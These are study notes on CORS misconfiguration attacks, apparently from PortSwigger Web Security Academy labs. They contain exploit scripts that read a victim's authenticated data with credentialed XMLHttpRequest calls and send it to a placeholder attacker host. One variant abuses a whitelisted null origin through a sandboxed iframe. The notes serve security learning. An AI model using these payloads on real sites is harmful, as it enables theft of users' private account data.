# CORS Notes

[Portswigger](https://portswigger.net/web-security/cors#what-is-cors-cross-origin-resource-sharing)

## Methodology

Example script to steal info from a user

```
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://vulnerable-website.com/sensitive-victim-data',true);
req.withCredentials = true;
req.send();

function reqListener() {
	location='//malicious-website.com/log?key='+this.responseText;
};
```

Using that script in an iframe for a whitelisted null in the origin value:

```
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','vulnerable-website.com/sensitive-victim-data',true);
req.withCredentials = true;
req.send();

function reqListener() {
location='malicious-website.com/log?key='+this.responseText;
};
</script>"></iframe>
```


## Labs Walkthrough

### Basic Origin Reflection Attack

- log into application and review the request to /accountDetails
- notice the usage of the `Access-Control-Allow-Origin` header, suggesting the usage of CORS
- ![image](https://github.com/user-attachments/assets/88d4be40-617a-442d-b257-20e37916e5e5).
- create the request by using the /accountDetails as the path for sensitive data and set location to just /log

```
<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','0aab0073041f4fa4815f39dc00ce00a4.web-security-academy.net/accountDetails',true);
req.withCredentials = true;
req.send();

function reqListener() {
location='/log?key='+this.responseText;
};
</script>
```

- 






